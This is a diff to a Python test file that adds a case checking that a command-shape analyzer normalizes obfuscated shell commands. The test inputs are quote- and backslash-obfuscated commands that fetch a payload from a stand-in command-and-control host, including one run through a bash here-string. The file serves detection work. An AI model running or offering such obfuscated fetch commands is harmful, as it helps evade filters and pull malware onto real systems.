@@ -143,6 +143,19 @@ def test_quoted_operator_is_an_argument_not_a_pipeline():
     assert command_shape_counts("echo ok | sh")["operator:|"] == 1
 
 
+def test_obfuscated_program_and_here_string_are_normalized():
+    shapes = command_shape_counts("c'u'r'l http://c2.local/payload")
+    assert shapes["program:curl"] == 1
+    assert shapes["value:url:http"] == 1
+
+    sh_shapes = command_shape_counts(r"/bin/b\a\s\h <<< 'curl http://c2.local/payload'")
+    assert sh_shapes["program:bash"] == 1
+    assert sh_shapes["operator:<<<"] == 1
+    assert sh_shapes["syntax:inline-shell"] == 1
+    assert sh_shapes["program:curl"] == 1
+
+
+
 @pytest.mark.parametrize(
     "command,marker",
     [
